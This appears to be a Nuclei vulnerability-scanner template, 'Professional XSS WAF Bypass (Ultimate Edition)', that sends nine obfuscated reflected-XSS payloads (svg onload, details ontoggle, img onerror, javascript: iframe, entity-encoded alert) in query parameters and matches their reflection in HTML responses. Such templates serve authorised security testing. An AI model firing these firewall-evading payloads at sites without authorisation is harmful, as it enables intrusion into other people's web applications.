id: ultimate-xss-pwn

info:
  name: Professional XSS WAF Bypass (Ultimate Edition)
  author: thenawabx
  severity: critical

http:
  - method: GET
    path:
      - "{{BaseURL}}/?q=<svg/onload=confirm?.(document.domain)>"
      - "{{BaseURL}}/?id=<details/open/ontoggle=prompt?.(1)>"
      - "{{BaseURL}}/?name=<img/src/onerror=confirm?.(8)>"
      - "{{BaseURL}}/?x=<marquee/onstart=confirm?.(1)>"
      - "{{BaseURL}}/?query=<svg//onload=%26%2397%3Blert%26%2340%3B1%26%2341%3B>"
      - "{{BaseURL}}/?s=<iframe/src=\"javascript:confirm?.(1)\">"
      - "{{BaseURL}}/?id=><details/open/ontoggle=confirm?.(1)><"
      - "{{BaseURL}}/?debug=<img/src/onerror=\".//alert?.(1)\">"
      - "{{BaseURL}}/?user=<svg><animatetransform/onbegin=confirm?.(1)>"

    matchers-condition: and
    matchers:
      - type: regex
        name: XSS-Found
        regex:
          - "(?i)(<svg/onload=|<details/open/ontoggle=|<img/src/onerror=|<marquee/onstart=|<svg><animatetransform)"
        part: body

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
